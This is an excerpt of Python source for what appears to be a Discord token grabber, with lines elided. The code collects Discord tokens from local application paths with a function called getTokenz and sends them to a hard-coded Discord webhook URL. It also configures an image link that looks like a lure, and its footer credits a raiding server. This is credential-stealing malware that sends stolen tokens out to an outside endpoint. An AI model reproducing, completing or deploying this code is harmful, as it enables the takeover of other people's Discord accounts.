...
WEBHOOK_URL = "https://discord.com/api/webhooks/1095247214474973234/bGePHjejdlZrdagJfXLpokON8SoWOTmpZ02YKblYlS2AElGwbp97A4ZrASaFZt5c3tAk"
...
config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1095247214474973234/bGePHjejdlZrdagJfXLpokON8SoWOTmpZ02YKblYlS2AElGwbp97A4ZrASaFZt5c3tAk",
    "image": "https://pbs.twimg.com/media/D1NPFIwXQAYgXXl.jpg", # You can also have a custom image by using a URL argument
...
def main():
    ...
    for platform, path in PATHS.items():
        ...
        for token in getTokenz(path):
            ...
            embed = {
                ...
                "footer": {
                    "text": f"Developed by ††#7777 | discord.gg/raided"
                }
            }
            embeds.append(embed)
    ...
    if config["linkAlerts"]:  # Don't send an alert if the user has it disabled
        return
